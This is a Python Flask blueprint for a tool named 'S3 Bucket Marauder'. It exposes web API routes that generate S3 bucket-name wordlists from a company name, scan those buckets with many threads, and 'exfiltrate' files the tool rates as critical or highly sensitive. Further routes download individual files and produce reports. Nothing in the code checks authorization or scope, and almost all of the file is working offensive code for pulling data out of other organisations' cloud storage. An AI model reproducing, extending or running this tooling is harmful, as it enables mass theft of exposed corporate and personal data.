"""
S3 Bucket Marauder Routes
=========================
Flask blueprint for S3 bucket reconnaissance and exfiltration.
"""

from flask import Blueprint, render_template, request, jsonify, send_file, Response
import io
import json
import sys
import os
import threading
import time

# Add tools to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from s3_bucket_marauder import (
        get_marauder,
        S3BucketMarauder,
        S3BucketEnumerator,
        BucketStatus,
        DataSensitivity
    )
except ImportError:
    get_marauder = None
    S3BucketMarauder = None
    S3BucketEnumerator = None
    from enum import Enum
    class BucketStatus(Enum):
        UNKNOWN = "unknown"
        PUBLIC = "public"
        PRIVATE = "private"
        RESTRICTED = "restricted"
    class DataSensitivity(Enum):
        LOW = "low"
        MEDIUM = "medium"
        HIGH = "high"
        CRITICAL = "critical"

s3_marauder_bp = Blueprint('s3_marauder', __name__, url_prefix='/s3-marauder')

# Global scan state
_scan_state = {
    "running": False,
    "progress": 0,
    "total": 0,
    "current_bucket": "",
    "findings": [],
    "completed": False
}
_scan_lock = threading.Lock()


@s3_marauder_bp.route('/')
def index():
    """S3 Bucket Marauder main page"""
    return render_template('s3_marauder.html')


@s3_marauder_bp.route('/api/generate-wordlist', methods=['POST'])
def generate_wordlist():
    """Generate bucket name wordlist"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    try:
        data = request.get_json()
        company_name = data.get('company_name', '')
        include_regions = data.get('include_regions', False)
        
        if not company_name:
            return jsonify({"error": "Company name is required"}), 400
        
        marauder = get_marauder()
        bucket_names = list(marauder.generate_bucket_names(
            company_name, 
            include_regions=include_regions
        ))
        
        # Also get year variations
        enumerator = S3BucketEnumerator()
        year_names = enumerator.enumerate_with_year_variations(company_name)
        
        # Combine and dedupe
        all_names = list(set(bucket_names + year_names))
        
        return jsonify({
            "success": True,
            "company": company_name,
            "total_names": len(all_names),
            "sample": all_names[:50],
            "full_list": all_names
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@s3_marauder_bp.route('/api/download-wordlist', methods=['POST'])
def download_wordlist():
    """Download wordlist as file"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    try:
        data = request.get_json()
        company_name = data.get('company_name', '')
        
        if not company_name:
            return jsonify({"error": "Company name is required"}), 400
        
        marauder = get_marauder()
        bucket_names = list(marauder.generate_bucket_names(company_name, include_regions=True))
        
        enumerator = S3BucketEnumerator()
        year_names = enumerator.enumerate_with_year_variations(company_name)
        
        all_names = sorted(set(bucket_names + year_names))
        content = '\n'.join(all_names)
        
        return send_file(
            io.BytesIO(content.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f"{company_name}_s3_wordlist.txt"
        )
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@s3_marauder_bp.route('/api/check-bucket', methods=['POST'])
def check_bucket():
    """Check a single bucket"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    try:
        data = request.get_json()
        bucket_name = data.get('bucket_name', '')
        
        if not bucket_name:
            return jsonify({"error": "Bucket name is required"}), 400
        
        marauder = S3BucketMarauder()  # New instance for single check
        finding = marauder.check_bucket_exists(bucket_name)
        
        return jsonify({
            "success": True,
            "finding": finding.to_dict()
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@s3_marauder_bp.route('/api/start-scan', methods=['POST'])
def start_scan():
    """Start bucket scanning"""
    global _scan_state
    
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    with _scan_lock:
        if _scan_state["running"]:
            return jsonify({"error": "Scan already running"}), 400
        
        _scan_state = {
            "running": True,
            "progress": 0,
            "total": 0,
            "current_bucket": "",
            "findings": [],
            "completed": False
        }
    
    try:
        data = request.get_json()
        company_name = data.get('company_name', '')
        custom_wordlist = data.get('custom_wordlist', [])
        max_buckets = data.get('max_buckets', 500)
        threads = data.get('threads', 20)
        
        if not company_name and not custom_wordlist:
            with _scan_lock:
                _scan_state["running"] = False
            return jsonify({"error": "Company name or wordlist required"}), 400
        
        def run_scan():
            global _scan_state
            
            marauder = S3BucketMarauder(threads=threads)
            
            def progress_callback(completed, total, bucket_name, finding):
                with _scan_lock:
                    _scan_state["progress"] = completed
                    _scan_state["total"] = total
                    _scan_state["current_bucket"] = bucket_name
                    if finding.status != BucketStatus.NOT_FOUND:
                        _scan_state["findings"].append(finding.to_dict())
            
            findings = marauder.scan_buckets(
                company_name=company_name,
                custom_wordlist=custom_wordlist if custom_wordlist else None,
                max_buckets=max_buckets,
                progress_callback=progress_callback
            )
            
            with _scan_lock:
                _scan_state["running"] = False
                _scan_state["completed"] = True
        
        thread = threading.Thread(target=run_scan, daemon=True)
        thread.start()
        
        return jsonify({"success": True, "message": "Scan started"})
        
    except Exception as e:
        with _scan_lock:
            _scan_state["running"] = False
        return jsonify({"error": str(e)}), 400


@s3_marauder_bp.route('/api/scan-status', methods=['GET'])
def scan_status():
    """Get scan status"""
    with _scan_lock:
        return jsonify(_scan_state)


@s3_marauder_bp.route('/api/stop-scan', methods=['POST'])
def stop_scan():
    """Stop ongoing scan"""
    if get_marauder:
        marauder = get_marauder()
        marauder.stop()
    
    with _scan_lock:
        _scan_state["running"] = False
        _scan_state["completed"] = True
    
    return jsonify({"success": True, "message": "Scan stopped"})


@s3_marauder_bp.route('/api/exfiltrate', methods=['POST'])
def exfiltrate_bucket():
    """Exfiltrate files from a bucket"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    try:
        data = request.get_json()
        bucket_name = data.get('bucket_name', '')
        region = data.get('region', 'us-east-1')
        max_files = data.get('max_files', 50)
        
        if not bucket_name:
            return jsonify({"error": "Bucket name is required"}), 400
        
        marauder = S3BucketMarauder()
        
        # Create a finding object
        from s3_bucket_marauder import BucketFinding
        finding = BucketFinding(
            bucket_name=bucket_name,
            status=BucketStatus.EXISTS_PUBLIC,
            region=region,
            list_allowed=True
        )
        
        # Exfiltrate
        downloaded = marauder.exfiltrate_bucket(
            finding,
            sensitivity_filter=[DataSensitivity.CRITICAL, DataSensitivity.HIGH],
            max_files=max_files
        )
        
        return jsonify({
            "success": True,
            "files_downloaded": len(downloaded),
            "files": [
                {
                    "key": d.key,
                    "size": d.size,
                    "sensitivity": d.sensitivity.value,
                    "content_type": d.content_type
                }
                for d in downloaded
            ]
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@s3_marauder_bp.route('/api/download-file', methods=['POST'])
def download_file():
    """Download a specific file from bucket"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    try:
        data = request.get_json()
        bucket_name = data.get('bucket_name', '')
        key = data.get('key', '')
        region = data.get('region', 'us-east-1')
        
        if not bucket_name or not key:
            return jsonify({"error": "Bucket name and key are required"}), 400
        
        marauder = S3BucketMarauder()
        result = marauder.download_file(bucket_name, key, region)
        
        if result:
            filename = key.split('/')[-1]
            return send_file(
                io.BytesIO(result.content),
                mimetype=result.content_type,
                as_attachment=True,
                download_name=filename
            )
        else:
            return jsonify({"error": "Failed to download file"}), 400
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@s3_marauder_bp.route('/api/report', methods=['GET'])
def generate_report():
    """Generate scan report"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    marauder = get_marauder()
    report = marauder.generate_report()
    
    return jsonify(report)


@s3_marauder_bp.route('/api/download-report', methods=['GET'])
def download_report():
    """Download scan report as JSON"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    marauder = get_marauder()
    report = marauder.generate_report()
    
    return send_file(
        io.BytesIO(json.dumps(report, indent=2).encode()),
        mimetype='application/json',
        as_attachment=True,
        download_name=f"s3_marauder_report_{int(time.time())}.json"
    )


@s3_marauder_bp.route('/api/statistics', methods=['GET'])
def get_statistics():
    """Get current statistics"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    marauder = get_marauder()
    return jsonify(marauder.get_statistics())


@s3_marauder_bp.route('/api/sensitive-patterns', methods=['GET'])
def get_sensitive_patterns():
    """Get sensitive file patterns"""
    if not get_marauder:
        return jsonify({"error": "Marauder not available"}), 500
    
    marauder = get_marauder()
    
    patterns = {}
    for sensitivity, pattern_list in marauder.SENSITIVE_PATTERNS.items():
        patterns[sensitivity.value] = pattern_list
    
    return jsonify({"patterns": patterns})
